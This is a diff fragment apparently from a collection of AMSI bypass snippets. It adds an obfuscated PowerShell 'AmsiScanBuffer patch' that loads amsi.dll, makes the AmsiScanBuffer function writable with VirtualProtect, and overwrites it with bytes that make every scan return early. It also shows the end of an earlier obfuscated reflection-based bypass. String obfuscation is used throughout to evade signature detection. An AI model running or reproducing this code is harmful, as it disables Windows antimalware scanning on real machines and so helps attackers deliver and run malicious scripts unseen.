@@ -34,3 +34,36 @@ substring(($_*2),2))})-replace " ",'NonPublic,Static').
 SetValue($null,$true)
 
 ```
+------
+```powershell
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$wznwh = @"
+using System;
+using System.Runtime.InteropServices;
+public class wznwh {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr llgdyi, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $wznwh
+
+$tusweqj = [wznwh]::LoadLibrary("$(('ámsì.d'+'ll').NoRMALIze([chAR]([BYtE]0x46)+[CHar]([bytE]0x6f)+[chAr]([ByTE]0x72)+[CHaR](93+16)+[cHar](5+63)) -replace [char]([byTE]0x5c)+[ChAR]([byTe]0x70)+[CHaR]([byTe]0x7b)+[Char](77)+[cHAr](110)+[cHar](125+28-28))")
+$hnoruy = [wznwh]::GetProcAddress($tusweqj, "$(('Ãms'+'íSc'+'ánB'+'uff'+'er').normALiZE([char]([BYTE]0x46)+[chaR](111)+[CHAR]([BYTe]0x72)+[CHar](109*26/26)+[CHAr]([bYTE]0x44)) -replace [chAr]([BYtE]0x5c)+[ChaR]([BYTe]0x70)+[chAr]([bYTE]0x7b)+[chaR]([Byte]0x4d)+[cHAr](102+8)+[Char]([Byte]0x7d))")
+$p = 0
+[wznwh]::VirtualProtect($hnoruy, [uint32]5, 0x40, [ref]$p)
+$whvg = "0xB8"
+$srlk = "0x57"
+$yxwc = "0x00"
+$zlnf = "0x07"
+$opxr = "0x80"
+$vmdp = "0xC3"
+$ruxtz = [Byte[]] ($whvg,$srlk,$yxwc,$zlnf,+$opxr,+$vmdp)
+[System.Runtime.InteropServices.Marshal]::Copy($ruxtz, 0, $hnoruy, 6)
+
+#(03/11/2021)
+```
